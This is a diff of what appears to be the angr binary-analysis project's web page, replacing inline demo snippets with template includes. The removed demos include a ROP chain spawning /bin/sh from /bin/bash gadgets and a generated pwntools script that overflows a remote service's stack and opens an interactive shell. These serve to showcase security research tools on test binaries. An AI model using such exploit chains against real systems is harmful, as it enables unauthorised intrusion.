@@ -11,7 +11,6 @@
 
     <p>As an introduction to angr's capabilities, here are some of the things that you can do using angr and the tools built with it:</p>
 
-    <!-- code from http://dabblet.com/gist/3157489 -->
     <ul>
       <li>
       Control-flow graph recovery.
@@ -19,29 +18,7 @@
         <input type="checkbox" id="cfg-example" class="expand-check">
         <label for="cfg-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
         <div class="expandable">
-          <pre>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angr</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">proj = angr.Project('<a href="https://github.com/angr/angr-doc/tree/master/examples/fauxware">./fauxware</a>')</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">cfg = proj.analyses.CFG()</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">dict(proj.kb.functions)</span>
-<span class="pyoutput">{4195552L: &lt;Function _init (0x4004e0)&gt;,
- 4195600L: &lt;Function plt.puts (0x400510)&gt;,
- 4195616L: &lt;Function plt.printf (0x400520)&gt;,
- 4195632L: &lt;Function plt.read (0x400530)&gt;,
- 4195648L: &lt;Function plt.__libc_start_main (0x400540)&gt;,
- 4195664L: &lt;Function plt.strcmp (0x400550)&gt;,
- 4195680L: &lt;Function plt.open (0x400560)&gt;,
- 4195696L: &lt;Function plt.exit (0x400570)&gt;,
- 4195712L: &lt;Function _start (0x400580)&gt;,
- 4195756L: &lt;Function call_gmon_start (0x4005ac)&gt;,
- 4195904L: &lt;Function frame_dummy (0x400640)&gt;,
- 4195940L: &lt;Function authenticate (0x400664)&gt;,
- 4196077L: &lt;Function accepted (0x4006ed)&gt;,
- 4196093L: &lt;Function rejected (0x4006fd)&gt;,
- 4196125L: &lt;Function main (0x40071d)&gt;,
- 4196320L: &lt;Function __libc_csu_init (0x4007e0)&gt;,
- 4196480L: &lt;Function __do_global_ctors_aux (0x400880)&gt;}</span>
-</pre>
+          {{ highlight .Site.Data.demos.cfg "python" "" }}
         </div>
       </span>
       <li>
@@ -50,19 +27,7 @@
         <input type="checkbox" id="symexec-example" class="expand-check">
         <label for="symexec-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
         <div class="expandable">
-          <pre>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import os</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angr</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">project = angr.Project("defcamp_quals_2015_r100", auto_load_libs=False)</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">path_group = project.factory.path_group()</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">path_group.explore(find=lambda path: 'Nice!' in path.state.posix.dumps(1))</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">print path_group.found[0].state.posix.dumps(0)</span>
-<span class="pyoutput">Code_Talkers</span>
-
-<span class="pyprompt">#</span> <span class="pyinput">./defcamp_quals_2015_r100</span>
-Enter the password: <span class="pyinput">Code_Talkers</span>
-Nice!
-</pre>
+            {{ highlight .Site.Data.demos.symbolic_execution "python" "" }}
         </div>
       </span>
       <li>
@@ -71,37 +36,7 @@ Nice!
         <input type="checkbox" id="rop-example" class="expand-check">
         <label for="rop-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
         <div class="expandable">
-          <pre>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angr</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angrop</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">project = angr.Project("/bin/bash", auto_load_libs=False)</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rop = project.analyses.ROP()</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rop.find_gadgets()</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rop.execve("/bin/sh").print_payload_code()</span>
-<span class="pyoutput">chain = ""
-chain += p64(0x4929bc)  # pop rax; ret
-chain += p64(0x702fb8)
-chain += p64(0x420b5c)  # pop rsi; ret
-chain += p64(0x68732f6e69622f)
-chain += p64(0x4a382a)  # mov qword ptr [rax + 8], rsi; xor eax, eax; ret
-chain += p64(0x4929bc)  # pop rax; ret
-chain += p64(0x3b)
-chain += p64(0x41e844)  # pop rdi; ret
-chain += p64(0x702fc0)
-chain += p64(0x4ed076)  # pop rdx; ret
-chain += p64(0x0)
-chain += p64(0x420b5c)  # pop rsi; ret
-chain += p64(0x0)
-chain += p64(0x401b94)
-chain += p64(0x0)
-chain += p64(0x0)
-chain += p64(0x0)
-chain += p64(0x0)
-chain += p64(0x0)
-chain += p64(0x0)
-chain += p64(0x0)
-</span>
-</pre>
+            {{ highlight .Site.Data.demos.rop "python" "" }}
         </div>
       </span>
       <li>
@@ -110,9 +45,7 @@ chain += p64(0x0)
         <input type="checkbox" id="patcherex-example" class="expand-check">
         <label for="patcherex-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
         <div class="expandable">
-          <pre>
-<span class="pyprompt">#</span> <span class="pyinput">patcherex/patch_master.py single test_binaries/CADET_00003 stackretencryption CADET_00003_stackretencryption</span>
-</pre>
+            {{ highlight .Site.Data.demos.patcherex "" "" }}
         </div>
       </span>
       <li>
@@ -121,25 +54,7 @@ chain += p64(0x0)
         <input type="checkbox" id="rex-example" class="expand-check">
         <label for="rex-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
         <div class="expandable">
-          <pre>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import rex</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rex.Crash("vuln_stacksmash", "A"*227).exploit().arsenal["rop_to_system"].script("x.py")</span>
-
-<span class="pyprompt">#</span> <span class="pyinput">cat x.py</span>
-<span class="pyoutput">import sys
-import time
-from pwn import *
-
-if len(sys.argv) < 3:
-    print "%s: <host> <port>" % sys.argv[0]
-    sys.exit(1)
-
-r = remote(sys.argv[1], int(sys.argv[2]))
-r.send('\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\x82\x04\x08\x10\x83\x04\x08\xf2\x82\x04\x08\x00\x00\x00\x00\x1f\xa0\x04\x08\x08\x00\x00\x00\xde\x82\x04\x08 \x83\x04\x08\xf5\x82\x04\x08\x1f\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
-time.sleep(.1)
-r.send('/bin/sh\x00')
-r.interactive()
-</pre>
+            {{ highlight .Site.Data.demos.rex "python" "" }}
         </div>
       </span>
       <li>
@@ -148,9 +63,7 @@ r.interactive()
         <input type="checkbox" id="am-example" class="expand-check">
         <label for="am-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
         <div class="expandable">
-          <pre>
-<span class="pyprompt">#</span> <span class="pyinput">angr-management/run-docker.sh</span>
-</pre>
+            {{ highlight .Site.Data.demos.angr_management "" "" }}
         </div>
       </span>
       <li>
